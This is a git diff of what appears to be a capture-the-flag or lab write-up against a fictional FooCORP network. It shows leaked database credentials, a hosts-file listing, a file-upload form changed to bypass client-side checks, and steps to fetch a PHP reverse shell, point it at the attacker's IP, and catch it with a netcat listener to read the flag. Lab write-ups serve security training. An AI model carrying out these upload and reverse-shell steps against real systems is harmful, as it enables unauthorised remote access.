@@ -240,7 +240,7 @@ Table: users
 
 ![](../.gitbook/assets/image%20%287%29.png)
 
-![](../.gitbook/assets/image%20%2810%29.png)
+![](../.gitbook/assets/image%20%2813%29.png)
 
 ```text
 <!-- = '127.0.0.1'; = 'dbuser'; = 'xXxyYyzZz789789)))'; = 'footracking'; = mysqli_connect(, , , );-->
@@ -254,4 +254,153 @@ mysql --host=172.16.64.92 --user=dbuser --password=xXxyYyzZz789789))) --port 633
 ![admin](../.gitbook/assets/image%20%289%29.png)
 
 ![](../.gitbook/assets/image%20%288%29.png)
+
+![](../.gitbook/assets/image%20%2811%29.png)
+
+```text
+127.0.0.1	dns.foocorp.io
+127.0.1.1	xubuntu
+127.0.0.1    iy1f8c0rbn4i50qsd4qp.foocorp.io
+127.0.0.1    zwue6qr1bozxee6ajbnh.foocorp.io
+127.0.0.1    imhiwugyiw47frjgiij4.foocorp.io
+127.0.0.1    ckwhi4l4zo2p7uuu6spz.foocorp.io
+127.0.0.1    8hyyv3bd2vg11lvnq6b5.foocorp.io
+127.0.0.1    fn8e3b420dm0tekjkat6.foocorp.io
+127.0.0.1    fi2ziinpstes1v37p4d4.foocorp.io
+127.0.0.1    kjz616ki35x4tmbnktdh.foocorp.io
+127.0.0.1    zl4fslkpip7pqvl8attn.foocorp.io
+127.0.0.1    q2qp90okqfpuf8z6qpl4.foocorp.io
+127.0.0.1    8kq8hxubqgv2xtk4thgb.foocorp.io
+127.0.0.1    anbapwaf51a4hnvhcyat.foocorp.io
+127.0.0.1    b5haajglmpf4oit5bjm4.foocorp.io
+127.0.0.1    djsx2456qb9uaht0kd64.foocorp.io
+127.0.0.1    goy4eil8flnwlsupnd1d.foocorp.io
+127.0.0.1    f72wlqc48agc3875keiq.foocorp.io
+127.0.0.1    hdny0sw0xnu2h3woeze6.foocorp.io
+127.0.0.1    j8mgna1cxid6hc603ugq.foocorp.io
+127.0.0.1    fe20nnrl0vnxcb6963se.foocorp.io
+127.0.0.1    z5cmau4ies9uwe4xfziw.foocorp.io
+127.0.0.1    48c1afiow6rdt39bzdlm.foocorp.io
+127.0.0.1    o8m5ma2371xe8z3l0ghc.foocorp.io
+127.0.0.1    4lwoyyvjg0unxz692pyf.foocorp.io
+127.0.0.1    hppbkxyes0heecvcisko.foocorp.io
+127.0.0.1    9afw8mkkyog4fi5rk4bj.foocorp.io
+127.0.0.1    2l2fhjboktwk3flrtq3k.foocorp.io
+127.0.0.1    yq0q4x5d2vpucsrps3a1.foocorp.io
+127.0.0.1    jcpgttczoggxfc3f25tm.foocorp.io
+127.0.0.1    0pm6duqbu2o8ajzkjeai.foocorp.io
+127.0.0.1    ttpxbpp88fgt9r3292ag.foocorp.io
+172.16.64.91    75ajvxi36vchsv584es1.foocorp.io
+127.0.0.1    9fys6zpn5k03zt299wyj.foocorp.io
+127.0.0.1    uvq8daoyiuq75znffwvy.foocorp.io
+127.0.0.1    qv0jwarev2y4lq69xy9w.foocorp.io
+127.0.0.1    h1z07t1pujg9ti677md0.foocorp.io
+127.0.0.1    k47x59arbizhwqoyy04q.foocorp.io
+127.0.0.1    h7ix8b28e1nzzg0juphd.foocorp.io
+127.0.0.1    1hwtyp1f5x456czwcwux.foocorp.io
+127.0.0.1    jw37e55tbtczfjne6zqv.foocorp.io
+127.0.0.1    xew9oz8r7dg8nfs5apq9.foocorp.io
+127.0.0.1    2oe8hpeyq6v4ihnj5mb7.foocorp.io
+127.0.0.1    ibp2xvjt4ysuvhjb49px.foocorp.io
+127.0.0.1    xvd7fegs05xx2v1cjoi8.foocorp.io
+127.0.0.1    gdgecqumgna9gylo5tt8.foocorp.io
+127.0.0.1    ysapyi9ob6ddgbbzpt63.foocorp.io
+127.0.0.1    rqcmqndvgfsekwwy4vgz.foocorp.io
+127.0.0.1    in8qd11im2ya2gecsu3r.foocorp.io
+127.0.0.1    u0nh94i31l7i5z4ny4mp.foocorp.io
+127.0.0.1    53xdmt8o6x9qh3c8rnav.foocorp.io
+127.0.0.1    jwwu7iov4jmc9u7bjb9c.foocorp.io
+127.0.0.1    2i2ztmdjpv2eb617ra0v.foocorp.io
+127.0.0.1    fdwrshpyzssjq5yda1kd.foocorp.io
+127.0.0.1    264eybx0yiy07nv2yi0p.foocorp.io
+127.0.0.1    zvlvgjfv1mebz32nmq63.foocorp.io
+127.0.0.1    6l83fq68pv3t8nc5ynq2.foocorp.io
+127.0.0.1    34l136cqhaogwfww9x82.foocorp.io
+127.0.0.1    0dlbn52zsrxa547ilv9b.foocorp.io
+127.0.0.1    wbzny08xz4zydaut3apy.foocorp.io
+127.0.0.1    b2ezlylj37skdrxvkm7v.foocorp.io
+127.0.0.1    dxr2k1ahg0bxm8wbg0hn.foocorp.io
+127.0.0.1    5cg49zf6n1gs1dnq5u3v.foocorp.io
+127.0.0.1    dapqf3pnluku2txm0652.foocorp.io
+127.0.0.1    oer6ycrynweft5skbmux.foocorp.io
+127.0.0.1    krhflurc0580erpqam3c.foocorp.io
+127.0.0.1    xk16t9hcq1searehrhhf.foocorp.io
+127.0.0.1    j4bfjd381vetby4rxaj5.foocorp.io
+127.0.0.1    f78fz1p7rv3a8dgkby0v.foocorp.io
+127.0.0.1    usvf2byvslgt0s8io91x.foocorp.io
+127.0.0.1    evtcvwrn6crvfeoqyrbl.foocorp.io
+127.0.0.1    3njj7cfc9j0qrmgb17t1.foocorp.io
+127.0.0.1    rawbalxwrbxa8efg1hq1.foocorp.io
+127.0.0.1    zlkxys2bvalnureium3n.foocorp.io
+127.0.0.1    4k09492kj7u7n1afepzn.foocorp.io
+127.0.0.1    v59svzohexao6tgrr7rq.foocorp.io
+127.0.0.1    iaqar5fxun7ytj4xqf8x.foocorp.io
+127.0.0.1    11mx1flyr50d3zt9goi3.foocorp.io
+127.0.0.1    j6jrmtruysat16qo6w7s.foocorp.io
+127.0.0.1    43d2k35em6ydaxnpvtun.foocorp.io
+127.0.0.1    p2c06nsbqfjt73h28pqp.foocorp.io
+127.0.0.1    m81e8uuwflet9dgsvibt.foocorp.io
+127.0.0.1    ujrvd3yj5wlwszhxgog0.foocorp.io
+127.0.0.1    4vt8ehj91xb5kea26hgp.foocorp.io
+127.0.0.1    axltw99yt1v0dpskuimf.foocorp.io
+127.0.0.1    iml77nd9ou3l99p9yxa5.foocorp.io
+127.0.0.1    zs9xad7z70e1zb9g6y2h.foocorp.io
+127.0.0.1    ahra6jh4p2rt5t4bh8gz.foocorp.io
+127.0.0.1    ryg3zale8n0kzu0hnrym.foocorp.io
+127.0.0.1    hdzuhx7pdhoa22lvszou.foocorp.io
+127.0.0.1    h6esni1hq4r0ygh98uge.foocorp.io
+127.0.0.1    mpnw16d3epbi1pqkvw8k.foocorp.io
+127.0.0.1    k6z33hu73ax9virswxso.foocorp.io
+127.0.0.1    o7alycoqzbu0n75x5ymi.foocorp.io
+127.0.0.1    n1tsohsykt79lyv3yoch.foocorp.io
+127.0.0.1    7a3p565g4f4fc59lhc1d.foocorp.io
+127.0.0.1    y2ecyuslfi9l3el2h7nt.foocorp.io
+127.0.0.1    0bnes919xtro0y34jb64.foocorp.io
+127.0.0.1    xn0ur7q4f6r7lf2jc2zi.foocorp.io
+127.0.0.1    qjuih48nzdjy70ylv4t1.foocorp.io
+127.0.0.1    coitkr5g3s331kusu04f.foocorp.io
+127.0.0.1    a7mcp90jyox2myn0eolw.foocorp.io
+```
+
+### 172.16.64.91
+
+```text
+172.16.64.91    75ajvxi36vchsv584es1.foocorp.io
+```
+
+![](../.gitbook/assets/image%20%2812%29.png)
+
+![](../.gitbook/assets/image%20%2810%29.png)
+
+To disable JS, copy file locally, and modify to:
+
+```markup
+<html><body style="background: black; color: white;">
+<center><div style="border: 1px yellow double">
+<br /><br />
+<form action="http://75ajvxi36vchsv584es1.foocorp.io/app/upload.php" method="post" enctype="multipart/form-data">
+<br />Select file to upload:
+<input type="file" name="fileToUpload" id="fileToUpload">
+<input type="submit" value="Upload" name="submit">
+</form>
+<br /><br />
+</div></center/>
+<hr /><br />
+<center>&copy; FooCORP 2019</center>
+<body></html>
+```
+
+Download, modify and upload to your local webpage this reverse shell while you listen with `nc -lnvp 1234` in your machine: 
+
+```text
+wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+sed -i 's/127.0.0.1/172.16.64.10/' php-payload.php
+```
+
+In your netcat:
+
+```text
+$ cat ./var/www/html/flag.txt
+Congratulations, you got this!
+```
 
